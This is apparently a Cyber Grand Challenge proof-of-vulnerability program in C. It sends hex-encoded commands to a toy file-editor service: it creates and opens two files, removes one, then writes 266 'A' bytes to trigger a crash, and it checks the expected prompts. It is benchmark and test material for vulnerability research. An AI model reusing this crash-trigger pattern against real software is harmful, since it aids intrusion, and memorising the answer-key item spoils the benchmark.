#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x6e\x65\x77\x20\x74\x65\x73\x74\x31\x0a\x6e\x65\x77\x20\x74\x65"
         "\x73\x74\x32\x0a\x6f\x70\x65\x6e\x20\x74\x65\x73\x74\x31\x0a\x6f"
         "\x70\x65\x6e\x20\x74\x65\x73\x74\x32\x0a\x72\x6d\x20\x74\x65\x73"
         "\x74\x31\x0a\x77\x72\x69\x74\x65\x20\x31\x0a\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x0a\x45\x4f\x46\x0a\x63\x6c\x6f\x73\x65\x20\x30"
         "\x0a\x0a";
      static unsigned int write_00000_00000_len = 338;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 170;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x24\x20\x24\x20\x24\x20\x5b\x74\x65\x73\x74\x31\x5d\x20\x6f\x70"
         "\x65\x6e\x65\x64\x20\x28\x30\x29\x0a\x24\x20\x5b\x74\x65\x73\x74"
         "\x32\x5d\x20\x6f\x70\x65\x6e\x65\x64\x20\x28\x31\x29\x0a\x24\x20"
         "\x24\x20\x3c\x3c\x20\x45\x64\x69\x74\x20\x4d\x6f\x64\x65\x20\x2d"
         "\x20\x65\x6e\x64\x20\x77\x69\x74\x68\x20\x45\x4f\x46\x20\x3e\x3e"
         "\x0a\x70\x6f\x73\x3a\x20\x30\x0a\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
         "\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
         "\x3d\x3d\x3d\x3d\x3d\x3d\x0a\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
         "\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
         "\x3d\x3d\x3d\x3d\x3d\x0a\x57\x72\x6f\x74\x65\x20\x32\x36\x36\x20"
         "\x62\x79\x74\x65\x28\x73\x29\x0a\x24\x20";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 170);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
}
